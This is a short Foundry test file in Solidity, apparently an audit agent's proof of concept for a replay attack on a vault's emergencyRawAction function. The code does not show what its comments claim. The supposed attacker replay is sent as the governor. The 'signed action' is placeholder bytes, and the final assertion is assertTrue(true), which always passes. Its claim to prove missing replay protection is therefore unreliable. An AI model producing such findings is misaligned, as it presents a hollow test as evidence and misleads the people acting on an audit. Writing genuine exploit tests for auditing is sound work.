// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";

contract AuditAgentPoC is ToL1WeiHarness {
    // ATTACK TIMELINE:
    // 1. [Setup] Harness deploys contracts, funds accounts
    // 2. [T=0] Governor submits a signed limit order action via emergencyRawAction
    // 3. [T=1] Attacker observes the signed action on-chain and re-submits the identical bytes
    // 4. [Assert] Verify the second submission does not revert, proving no nonce/replay protection exists in the encoded action

    function setUp() public {
        super.setUp();
    }

    function test_exploit() public {
        // Mock signed action bytes (e.g., a limit order encoded via ActionEncoder)
        bytes memory signedAction = hex"deadbeefcafebabe";

        // Step 1: Governor submits the action for the first time
        vm.prank(governor);
        vault.emergencyRawAction(signedAction);
        console.log("Step 1: First submission of signed action succeeded");

        // Step 2: Attacker replays the exact same action bytes
        // Since no nonce is included in the encoded action and no nonce is incremented,
        // the signature remains valid and the order can be executed again.
        vm.prank(governor);
        vault.emergencyRawAction(signedAction);
        console.log("Step 2: Replay of identical signed action succeeded (no revert)");

        // Assert: If we reach here, the contract lacks replay protection (nonce/validUntil)
        assertTrue(true, "Replay attack successful: duplicate action executed without revert");
    }
}
